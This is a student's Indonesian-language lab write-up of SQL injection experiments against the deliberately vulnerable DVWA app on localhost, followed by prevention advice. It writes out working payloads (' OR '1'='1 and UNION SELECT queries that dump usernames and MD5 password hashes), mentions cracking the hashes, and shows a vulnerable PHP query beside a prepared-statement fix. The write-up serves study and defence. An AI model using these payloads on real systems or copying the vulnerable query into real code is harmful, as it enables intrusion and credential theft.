# hasil_eksperimen-SQL-Injection

NAMA : MUHAMMAD ARKHAMULLAH RIFAI ASSHIDIQ
NIM:312410545

# Eksperimen SQL Injection menggunakan DVWA

Dokumentasi eksperimen SQL Injection yang dilakukan sebagai bagian dari artikel UTS Pemrograman Web.

**Artikel lengkap:** [SQL Injection: Ketika Satu Baris Input Bisa Meruntuhkan Seluruh Database](https://medium.com/@arkhammulloh123/sql-injection-ketika-satu-baris-input-bisa-meruntuhkan-seluruh-database-91264fdbb4b1)

---

## Environment

| Komponen | Detail |
|----------|--------|
| OS | Windows 11 |
| Web Server | Apache (via XAMPP) |
| Database | MariaDB 10.4.32 |
| Tools | DVWA, Chrome |
| Security Level | Low |

---

## Persiapan

### 1. Install XAMPP
Download dan install XAMPP dari https://www.apachefriends.org

### 2. Download DVWA
Download DVWA dari https://github.com/digininja/DVWA dan ekstrak ke:
```
C:\xampp\htdocs\dvwa\
```

### 3. Konfigurasi DVWA
Masuk ke folder `C:\xampp\htdocs\dvwa\config\`, buat file `config.inc.php` dengan isi:
```php
<?php
$DBMS = 'MySQL';
$_DVWA = array();
$_DVWA['db_server']   = '127.0.0.1';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user']     = 'root';
$_DVWA['db_password'] = '';
$_DVWA['db_port']     = '3306';
$_DVWA['default_security_level'] = 'low';
?>
```

### 4. Setup Database
- Jalankan Apache dan MySQL di XAMPP Control Panel
- Buka browser, akses `http://localhost/dvwa/setup.php`
- Klik tombol **Create / Reset Database**

### 5. Login DVWA
Akses `http://localhost/dvwa/login.php` dengan kredensial:
- Username: `admin`
- Password: `password`

### 6. Set Security Level
Klik **DVWA Security** di menu kiri, pilih **Low**, klik **Submit**

---

## Langkah Eksperimen

### Eksperimen 1: Input Normal

Akses menu **SQL Injection** di sidebar, masukkan input berikut:

```
Input: 1
```

**Hasil:**
```
ID: 1
First name: admin
Surname: admin
```

Aplikasi mengembalikan satu data user sesuai ID yang dimasukkan. Ini adalah perilaku normal.

![Eksperimen 1](https://github.com/MuhammadArkham/hasil_eksperimen-SQL-Injection/blob/main/Screenshot%202026-04-29%20155617.png?raw=true)

---

### Eksperimen 2: Deteksi Kerentanan

Masukkan tanda petik tunggal untuk menguji apakah aplikasi rentan:

```
Input: '
```

**Hasil:**
```
Fatal error: Uncaught mysqli_sql_exception: 
You have an error in your SQL syntax...
```

Error SQL muncul langsung di browser, membuktikan input tidak disanitasi sebelum dimasukkan ke query database.

![Eksperimen 2](screenshots/exp2-sql-error.png)

---

### Eksperimen 3: Dump Seluruh Data User

Gunakan payload klasik SQL Injection:

```
Input: ' OR '1'='1
```

**Hasil:**
```
First name: admin    | Surname: admin
First name: Gordon   | Surname: Brown
First name: Hack     | Surname: Me
First name: Pablo    | Surname: Picasso
First name: Bob      | Surname: Smith
```

Seluruh isi tabel users berhasil diekstrak hanya dengan satu baris input.

![Eksperimen 3](https://github.com/MuhammadArkham/hasil_eksperimen-SQL-Injection/blob/main/preview.webp?raw=true)

---

### Eksperimen 4: Mengekstrak Versi Database (UNION Attack)

Gunakan UNION-based injection untuk mengekstrak informasi server:

```
Input: ' UNION SELECT null, version()-- -
```

**Hasil:**
```
Surname: 10.4.32-MariaDB
```

Versi database berhasil ditampilkan. Informasi ini berguna bagi penyerang untuk mencari eksploit spesifik pada versi tersebut.

![Eksperimen 4](https://github.com/MuhammadArkham/hasil_eksperimen-SQL-Injection/blob/main/Screenshot%202026-04-29%20161218.png?raw=true)

---

### Eksperimen 5: Mengekstrak Username dan Password Hash

Ekstrak langsung kredensial semua user dari database:

```
Input: ' UNION SELECT user, password FROM users-- -
```

**Hasil:**
```
admin   : 5f4dcc3b5aa765d61d8327deb882cf99
gordonb : e99a18c428cb38d5f260853678922e03
1337    : 8d3533d75ae2c3966d7e0d4fcc69216b
pablo   : 0d107d09f5bbe40cade3de5c71e9e9b7
smithy  : 5f4dcc3b5aa765d61d8327deb882cf99
```

Seluruh username dan hash password MD5 berhasil diekstrak. Hash MD5 dapat di-crack menggunakan tools seperti hashcat atau situs crackstation.net.

![Eksperimen 5](https://github.com/MuhammadArkham/hasil_eksperimen-SQL-Injection/blob/main/Screenshot%202026-04-29%20161256.png?raw=true)

---

## Cara Pencegahan

### Prepared Statements (Cara Paling Efektif)

**Kode rentan:**
```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
```

**Kode aman:**
```php
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("s", $id);
$stmt->execute();
$result = $stmt->get_result();
```

### Validasi Input
```php
$id = $_GET['id'];
if (!is_numeric($id)) {
    die("Input tidak valid.");
}
```

### Sembunyikan Error Database
```php
ini_set('display_errors', 0);
error_reporting(0);
ini_set('log_errors', 1);
ini_set('error_log', '/path/to/error.log');
```

### Least Privilege pada Database
```sql
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT ON myapp_db.* TO 'app_user'@'localhost';
FLUSH PRIVILEGES;
```

---

## Referensi

1. OWASP Foundation. *SQL Injection*. https://owasp.org/www-community/attacks/SQL_Injection
2. PortSwigger Web Security Academy. *SQL Injection*. https://portswigger.net/web-security/sql-injection
3. DVWA (Damn Vulnerable Web Application). https://github.com/digininja/DVWA
4. PHP Documentation. *Prepared Statements*. https://www.php.net/manual/en/pdo.prepared-statements.php
5. OWASP. *OWASP Top Ten*. https://owasp.org/www-project-top-ten/
